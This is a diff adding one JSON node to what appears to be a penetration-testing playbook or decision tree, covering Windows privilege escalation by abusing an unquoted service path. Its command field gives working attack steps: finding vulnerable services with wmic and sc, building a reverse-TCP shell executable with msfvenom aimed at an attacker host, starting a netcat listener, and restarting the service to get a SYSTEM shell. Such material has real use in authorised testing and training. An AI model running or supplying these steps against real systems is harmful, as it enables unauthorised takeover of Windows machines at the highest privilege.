@@ -1,0 +1,18 @@
+{
+  "id": "unquoted_service",
+  "phase": "WINDOWS",
+  "title": "Unquoted Service Path",
+  "body": "Service path with spaces and no quotes = Windows searches each path component. Drop your binary in the writable prefix location.",
+  "cmd": "# Find unquoted paths\nwmic service get name,displayname,pathname,startmode \\\n  | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"\n\n# Manual check with sc\nsc qc <ServiceName>\n\n# Example vulnerable path:\n# C:\\Program Files\\Some Folder\\service.exe\n# Windows tries: C:\\Program.exe first (writable?)\n#               C:\\Program Files\\Some.exe\n\n# Generate payload (no MSF console needed — msfvenom is standalone)\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$lhost LPORT=$lport -f exe -o Program.exe\n\n# Transfer payload to writable location\n# Start listener: nc -nlvp $lport\nsc stop <ServiceName>\nsc start <ServiceName>",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Service restart — got SYSTEM shell",
+      "next": "got_root_windows"
+    },
+    {
+      "label": "Can't write to that path",
+      "next": "weak_service"
+    }
+  ]
+}
